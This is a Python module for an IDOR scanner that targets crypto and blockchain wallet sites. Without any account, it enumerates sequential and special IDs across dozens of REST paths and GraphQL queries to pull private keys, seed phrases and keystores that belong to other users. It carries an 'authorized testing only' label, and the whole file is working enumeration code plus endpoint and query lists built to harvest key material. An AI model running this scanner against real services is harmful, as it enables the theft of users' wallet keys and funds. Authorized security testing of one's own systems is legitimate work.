"""
IDOR Scanner for Crypto/Blockchain Key Endpoints

Targets the vulnerability class described in:
  "How I was able to access any public/private keys in a blockchain website"

Attack pattern: Blockchain/crypto sites that expose wallet keypairs via
API endpoints with predictable/enumerable identifiers and no proper
authorization checks (IDOR - Insecure Direct Object Reference).

NO ACCOUNT REQUIRED — uses differential/baseline analysis:
  1. Probe each endpoint with a known-invalid ID to capture the "not found"
     baseline (status, size, content fingerprint).
  2. Enumerate real IDs and flag any response that deviates from baseline.
  3. Directly scan all 200 responses for cryptographic key material.

FOR AUTHORIZED SECURITY TESTING ONLY.
"""

import re
import time
import random
import hashlib
import threading
from dataclasses import dataclass, field
from typing import Optional
from urllib.parse import urljoin

import requests

from modules.key_detector import KeyDetector

# Common endpoint patterns seen on crypto/blockchain wallet sites
KEY_ENDPOINT_PATTERNS = [
    "/api/wallet/{id}",
    "/api/wallet/{id}/keys",
    "/api/wallet/{id}/keypair",
    "/api/wallet/{id}/export",
    "/api/user/{id}/wallet",
    "/api/user/{id}/keys",
    "/api/account/{id}",
    "/api/account/{id}/keys",
    "/api/key/{id}",
    "/api/keys/{id}",
    "/api/address/{id}",
    "/api/v1/wallet/{id}",
    "/api/v1/wallet/{id}/keys",
    "/api/v1/user/{id}/wallet",
    "/api/v1/key/{id}",
    "/api/v2/wallet/{id}",
    "/api/v2/key/{id}",
    "/wallet/{id}",
    "/wallet/{id}/export",
    "/wallet/{id}/private",
    "/key/{id}",
    "/keys/{id}",
    "/account/{id}/export",
    "/user/{id}/wallet",
    "/user/{id}/keys",
    # Blockchain-specific (EVM)
    "/api/address/{id}/privatekey",
    "/api/address/{id}/wif",
    "/api/address/{id}/export",
    "/api/mnemonic/{id}",
    "/api/seed/{id}",
    "/api/keystore/{id}",
    "/api/vault/{id}",
    "/api/vault/{id}/unlock",
    # Solana-specific endpoints
    "/api/solana/wallet/{id}",
    "/api/solana/wallet/{id}/keypair",
    "/api/solana/wallet/{id}/export",
    "/api/solana/account/{id}",
    "/api/solana/account/{id}/keys",
    "/api/solana/keypair/{id}",
    "/api/keypair/{id}",
    "/api/keypair/{id}/export",
    "/api/solana/key/{id}",
    "/api/solana/user/{id}/wallet",
    # GraphQL
    "/graphql",
]

# IDs that should reliably return "not found" — used for baseline calibration
CANARY_IDS = ["999999999", "00000000-dead-beef-0000-000000000000", "____invalid____"]

GRAPHQL_QUERIES = [
    # Generic
    '{"query": "{ wallet(id: ID_PLACEHOLDER) { privateKey publicKey address } }"}',
    '{"query": "{ user(id: ID_PLACEHOLDER) { wallet { privateKey publicKey } } }"}',
    '{"query": "{ key(id: ID_PLACEHOLDER) { private public } }"}',
    '{"query": "query GetWallet($id: ID!) { wallet(id: $id) { privateKey publicKey mnemonic } }", "variables": {"id": "ID_PLACEHOLDER"}}',
    # Solana-specific
    '{"query": "{ solanaWallet(id: ID_PLACEHOLDER) { secretKey publicKey keypair } }"}',
    '{"query": "{ keypair(id: ID_PLACEHOLDER) { secretKey publicKey encoded } }"}',
]


@dataclass
class ResponseBaseline:
    """Fingerprint of an endpoint's "not found" response for differential comparison."""
    status_code: int
    content_length: int          # bytes
    body_hash: str               # md5 of body for exact-match detection
    is_json_error: bool          # returns JSON error structure
    # Thresholds: responses deviating beyond these are flagged
    size_deviation_threshold: int = 100  # bytes


@dataclass
class IDORFinding:
    endpoint: str
    reference_id: str
    status_code: int
    response_snippet: str
    keys_found: list
    severity: str
    evidence: str
    differential: bool = False   # True if found via baseline deviation, not direct key match


@dataclass
class IDORScanResult:
    target: str
    findings: list = field(default_factory=list)
    endpoints_tested: int = 0
    ids_tested: int = 0
    live_endpoints: int = 0      # Endpoints that returned non-baseline responses
    errors: list = field(default_factory=list)


def _md5(text: str) -> str:
    return hashlib.md5(text.encode("utf-8", errors="replace")).hexdigest()


class IDORScanner:
    """
    Scans for IDOR vulnerabilities on blockchain/crypto wallet API endpoints.

    Works WITHOUT registering an account by using differential analysis:
      - Calibrates each endpoint with known-invalid IDs to learn what
        "not found" looks like for that specific endpoint.
      - Flags any ID that returns a response meaningfully different from
        the "not found" baseline (different status, very different body size,
        or different content structure).
      - Additionally scans all responses directly for key material patterns.
    """

    def __init__(
        self,
        session: requests.Session,
        delay: float = 0.5,
        max_ids: int = 30,
        verbose: bool = False,
    ):
        self.session = session
        self.delay = delay
        self.max_ids = max_ids
        self.verbose = verbose
        self.key_detector = KeyDetector()
        self._lock = threading.Lock()

    # ──────────────────────────────────────────────────────────
    # ID generation
    # ──────────────────────────────────────────────────────────

    def _build_id_list(self, seed_id: Optional[int] = None) -> list:
        """
        Build the list of IDs to enumerate.

        No account needed: defaults to sequential integers 1..max_ids.
        If a seed_id is provided (e.g. discovered via a public profile page
        without logging in), we also test neighbors around it.
        """
        ids = []

        if seed_id is not None:
            for offset in range(-10, self.max_ids):
                candidate = seed_id + offset
                if candidate > 0:
                    ids.append(str(candidate))
        else:
            # Sequential low integers — auto-increment PKs start at 1
            ids.extend(str(i) for i in range(1, self.max_ids + 1))

        # Symbolic / special values that sometimes bypass checks
        ids += ["0", "admin", "test", "null", "undefined", "me", "self"]

        # UUID zero-padded variants
        ids += [
            "00000000-0000-0000-0000-000000000001",
            "00000000-0000-0000-0000-000000000002",
        ]

        return ids

    # ──────────────────────────────────────────────────────────
    # Baseline calibration (no account needed)
    # ──────────────────────────────────────────────────────────

    def _calibrate_baseline(self, url_template: str) -> Optional[ResponseBaseline]:
        """
        Hit an endpoint with guaranteed-invalid IDs to learn what its
        "object not found" response looks like.

        Returns None if the endpoint itself is unreachable (404/5xx on canary).
        """
        baselines = []

        for canary in CANARY_IDS:
            url = url_template.replace("{id}", canary)
            try:
                time.sleep(self.delay * 0.5)
                resp = self.session.get(url, timeout=8)

                # If canary returns 200, this endpoint may not use IDs at all
                # or always returns data — skip it for differential (still scan for keys)
                if resp.status_code == 200:
                    return None  # Caller handles: scan body for keys directly

                baselines.append(ResponseBaseline(
                    status_code=resp.status_code,
                    content_length=len(resp.content),
                    body_hash=_md5(resp.text),
                    is_json_error=("error" in resp.text.lower() or "not found" in resp.text.lower()),
                ))
            except requests.exceptions.RequestException:
                pass

        if not baselines:
            return None

        # Use the most common status/size across canary probes as the baseline
        return baselines[0]

    def _is_baseline_deviation(
        self, resp: requests.Response, baseline: ResponseBaseline
    ) -> bool:
        """
        Determine whether a response differs meaningfully from the
        "not found" baseline — indicating a real object was found (IDOR).
        """
        # Different HTTP status
        if resp.status_code != baseline.status_code:
            return True

        # Exact same body as baseline → not interesting
        if _md5(resp.text) == baseline.body_hash:
            return False

        # Body size significantly larger than baseline
        size_diff = abs(len(resp.content) - baseline.content_length)
        if size_diff > baseline.size_deviation_threshold:
            return True

        # Different JSON structure (new fields present)
        if resp.headers.get("Content-Type", "").startswith("application/json"):
            if self._looks_like_key_response(resp.text):
                return True

        return False

    # ──────────────────────────────────────────────────────────
    # Endpoint testing
    # ──────────────────────────────────────────────────────────

    def _test_endpoint(
        self,
        base_url: str,
        pattern: str,
        obj_id: str,
        baseline: Optional[ResponseBaseline],
    ) -> Optional[IDORFinding]:
        """Test a single endpoint+ID combination."""
        url = urljoin(base_url, pattern.replace("{id}", obj_id))

        try:
            time.sleep(self.delay + random.uniform(0, 0.15))
            resp = self.session.get(url, timeout=10)
            content = resp.text

            # 1. Direct key material detection — always check regardless of status
            keys_found = self.key_detector.detect(content)
            if keys_found:
                severity = "CRITICAL" if any(
                    k["type"] in (
                        "eth_private_key", "wif_key", "mnemonic_hint",
                        "keystore_json", "xpriv", "solana_private_key",
                        "json_private_field", "json_wif", "mnemonic_wordlist",
                    )
                    for k in keys_found
                ) else "HIGH"

                return IDORFinding(
                    endpoint=url,
                    reference_id=obj_id,
                    status_code=resp.status_code,
                    response_snippet=content[:500].replace("\n", " ").strip(),
                    keys_found=keys_found,
                    severity=severity,
                    evidence=f"HTTP {resp.status_code} → {len(keys_found)} key pattern(s) detected",
                    differential=False,
                )

            # 2. Differential analysis — response deviates from "not found" baseline
            if baseline is not None and self._is_baseline_deviation(resp, baseline):
                if resp.status_code not in (404, 410, 500, 502, 503):
                    return IDORFinding(
                        endpoint=url,
                        reference_id=obj_id,
                        status_code=resp.status_code,
                        response_snippet=content[:400].replace("\n", " ").strip(),
                        keys_found=[],
                        severity="HIGH",
                        evidence=(
                            f"HTTP {resp.status_code} deviates from baseline "
                            f"(baseline={baseline.status_code}, "
                            f"size_delta={abs(len(resp.content)-baseline.content_length)}B) "
                            f"— possible IDOR, review manually"
                        ),
                        differential=True,
                    )

            # 3. Crypto field heuristic on 200 responses (no baseline deviation needed)
            if resp.status_code == 200 and self._looks_like_key_response(content):
                return IDORFinding(
                    endpoint=url,
                    reference_id=obj_id,
                    status_code=200,
                    response_snippet=content[:300].replace("\n", " ").strip(),
                    keys_found=[],
                    severity="MEDIUM",
                    evidence="HTTP 200 with multiple crypto-related fields — review for key exposure",
                    differential=False,
                )

        except requests.exceptions.RequestException:
            pass

        return None

    def _test_graphql(self, base_url: str, obj_id: str) -> Optional[IDORFinding]:
        """Test GraphQL endpoints for key data via IDOR."""
        url = urljoin(base_url, "/graphql")

        for query_template in GRAPHQL_QUERIES:
            query = query_template.replace("ID_PLACEHOLDER", obj_id)
            try:
                time.sleep(self.delay)
                resp = self.session.post(
                    url,
                    data=query,
                    headers={"Content-Type": "application/json"},
                    timeout=10,
                )
                if resp.status_code == 200:
                    keys = self.key_detector.detect(resp.text)
                    if keys:
                        return IDORFinding(
                            endpoint=url,
                            reference_id=obj_id,
                            status_code=200,
                            response_snippet=resp.text[:400],
                            keys_found=keys,
                            severity="CRITICAL",
                            evidence=f"GraphQL returned key material for id={obj_id}",
                        )
            except requests.exceptions.RequestException:
                pass
        return None

    def _looks_like_key_response(self, content: str) -> bool:
        """Heuristic: ≥2 crypto-related field names in the response."""
        crypto_fields = [
            "privatekey", "private_key", "publickey", "public_key",
            "mnemonic", "seedphrase", "seed_phrase", "keystore",
            "wif", "xpriv", "xpub", "address", "wallet", "keypair",
            # Solana-specific
            "secretkey", "secret_key", "signingkey", "solana",
            "pubkey", "lamports", "blockhash",
        ]
        content_lower = content.lower()
        return sum(1 for f in crypto_fields if f in content_lower) >= 2

    # ──────────────────────────────────────────────────────────
    # Public scan entry point
    # ──────────────────────────────────────────────────────────

    def scan(self, base_url: str, seed_id: Optional[int] = None) -> IDORScanResult:
        """
        Run a full IDOR scan.  No account registration required.

        Args:
            base_url: Target base URL
            seed_id:  Optional integer ID (e.g. found on a public profile
                      page) to use as enumeration anchor.  If omitted,
                      sequential 1..max_ids is used.
        """
        result = IDORScanResult(target=base_url)
        ids = self._build_id_list(seed_id)
        result.ids_tested = len(ids)

        rest_patterns = [p for p in KEY_ENDPOINT_PATTERNS if p != "/graphql"]
        result.endpoints_tested = len(rest_patterns) * len(ids)

        for pattern in rest_patterns:
            # Calibrate baseline for this endpoint (no account needed)
            url_template = urljoin(base_url, pattern)
            baseline = self._calibrate_baseline(url_template)

            # baseline=None means canary returned 200 — endpoint always responds;
            # we still scan every response for key material.

            for obj_id in ids:
                finding = self._test_endpoint(base_url, pattern, obj_id, baseline)
                if finding:
                    with self._lock:
                        result.findings.append(finding)
                        if finding.differential:
                            result.live_endpoints += 1

        # GraphQL (limited set of IDs to keep noise low)
        for obj_id in ids[:8]:
            finding = self._test_graphql(base_url, obj_id)
            if finding:
                with self._lock:
                    result.findings.append(finding)

        return result
